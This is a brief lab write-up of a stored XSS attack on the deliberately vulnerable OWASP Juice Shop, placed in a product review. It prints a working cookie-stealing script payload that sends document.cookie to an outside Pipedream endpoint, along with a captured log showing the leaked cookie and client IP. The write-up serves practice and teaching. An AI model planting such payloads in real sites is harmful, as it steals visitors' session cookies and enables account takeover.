# Stored XSS on Juice Shop (Cookie Stealer Lab)

I practiced a Stored XSS attack inside `OWASP Juice Shop`, targeting the product review section.
Review box under a product (Apple Juice). I wrote a fake review like:
```js
<script>
  new Image().src = "https://eodo5udpevensc2.m.pipedream.net/?c=" + document.cookie;
</script>
```
This payload stored successfully and executed when the page reloaded.

## What the payload above does
- Injects a `<script>` into the DOM
- Uses new `Image().src` to send a GET request with document.cookie to my Pipedream server
- Works silently—no alert, no prompt, just data theft

## Server Responsse
Captured this when someone viewed the product:
```js
query
  c: language=en; welcomebanner_status=dismiss; ...
client_ip: 102.176.75.142
```
It means the victim’s browser executed the script and leaked their cookie.
